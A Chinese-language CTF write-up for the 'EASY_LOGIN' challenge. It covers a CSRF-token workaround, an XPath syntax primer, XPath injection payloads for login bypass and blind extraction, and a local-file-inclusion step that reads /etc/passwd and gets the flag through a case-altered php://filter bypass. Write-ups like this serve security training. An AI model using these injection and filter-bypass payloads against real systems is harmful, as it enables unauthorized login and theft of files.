# 题目说明

题目名称：EASY_LOGIN

无需任何扫描

## CSRF TOKEN

登录时，一个session只能维持15s，而且由于csrf-token的存在请求不能直接重放；因此可以写个脚本，第一次GET请求时携带着随机的SESSID，获取到token，第二次使用这个SESSID和token去POST提交；

## XPath盲注

XPath是XML的路径语言，使用路径表达式来选取XML文档中的节点或者节点集

### 基础语法

1.表达式

| 表达式   | 描述                                                     |      |
| -------- | -------------------------------------------------------- | ---- |
| nodename | 选取此节点的所有子节点                                   |      |
| /        | 从根节点选取                                             |      |
| //       | 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置 |      |
| .        | 选取当前节点                                             |      |
| ..       | 选取当前节点的父节点                                     |      |
| @        | 选取属性或　@*：匹配任何属性节点                         |      |
| *        | 匹配任何元素节点                                         |      |

例如：

| 表达式          | 结果                                                         |
| --------------- | ------------------------------------------------------------ |
| bookstore       | 选取 bookstore 元素的所有子节点                              |
| /bookstore      | 选取根元素 bookstore                                         |
| bookstore/book  | 选取属于 bookstore 的子元素的所有 book 元素                  |
| //book          | 选取所有 book 子元素,而不管它们在文档中的位置                |
| bookstore//book | 选择属于 bookstore 元素的后代的所有 book 元素,而不管它们位于 bookstore 之下的什么位置 |
| //@lang         | 选取名为 lang 的所有属性                                     |

2.限定语：

| 表达式                             | 结果                                                         |
| ---------------------------------- | ------------------------------------------------------------ |
| /bookstore/book[1]                 | 选取属于 bookstore 子元素的第一个 book 元素                  |
| /bookstore/book[last()]            | 选取属于 bookstore 子元素的最后一个 book 元素                |
| //title[@lang]                     | 选取所有拥有名为 lang 的属性的 title 元素                    |
| //title[@lang=’eng’]               | 选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性     |
| /bookstore/book[price>35.00]/title | 选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00 |

3.通配符：

| 通配符 | 描述               |
| ------ | ------------------ |
| *      | 匹配任何元素节点   |
| @*     | 匹配任何属性节点   |
| node() | 匹配任何类型的节点 |

4.运算符：

| 运算符       | 描述                           |
| ------------ | ------------------------------ |
| \|           | 计算两个节点集                 |
| +、-、*、div | 加、减、乘、除                 |
| =            | 等于                           |
| !=           | 不等于                         |
| <、<=、>、>= | 小于、小于等于、大于、大于等于 |
| or           | 或                             |
| and          | 与                             |
| mod          | 求余                           |

5.函数：

| 函数名     | 描述     |
| ---------- | -------- |
| text()     | 元素值   |
| position() | 标签位置 |
| name()     | 标签名称 |

### 注入与绕过

查询语句为：

	$query = "/root/accounts/user[username/text()='".$name."' and password/text()='".$pwd."']";

1.万能密码，这点和SQL很像；在知道用户名的情况：

	?name=admin' or '1'='1&pwd=fake

在不知道用户名的情况，使用两个or绕过：

	?name=fake' or '1'or'1&pwd=fake

2.使用`|`操作符，

	?name=1']|//*|ss['&pwd=fake

其执行的语句为：

	/root/accounts/user[username/text()='1' ]|//*|ss['' and password/text()='1']

即先闭合前面的语句，之后`//*`列出文档所有元素

3.盲注，需要一级一级猜解节点；猜解第一级节点：

	?name=1' or substring(name(/*[position()=1]),1,1)='r' or '1'='1&pwd=fake

猜解第二级节点数量：

	?name=1' or count(/root/*)=2 or '1'='1&fake

猜解第二级节点：

	?name=1' or substring(name(/root/*[position()=1]),1,1)='u' or '1'='1&pwd=fake

猜解id为1的user节点下的username值：

	?name=1' or substring(/root/users/user[id=1]/username,1,1)='a' or '1'='1&pwd=fake

回到这道题目上，当尝试XXE、SQL注入的方式行不通的话，可以尝试使用`1' or 1 or '1`，会发现返回的内容和登录失败的内容不一样，那么可由此推断出这里存在XPath注入；这道题用上述方法即可注出adm1n的密码，将密码md5解密后即可登录

## PHP伪协议读取flag

登录成功跳转到`admin.php?file=welcome`，并且有个提示flag在/flag，输入参数`file=/etc/passwd`返回了其内容，但使用一般的`php://filter`发现其被过滤了，那么尝试后发现过滤了一下关键字：

	php:
	.php
	read
	base

并且返回的内容中不能含有`flag`字符串，fuzz后发现其没有过滤大小写，那么用大写绕过协议，read可省略，编码方式使用rot13：

	pHp://filter/string.rot13/resource=/flag

即可拿到flag

# 其他

附件：exp.py，用于注出用户名和密码
























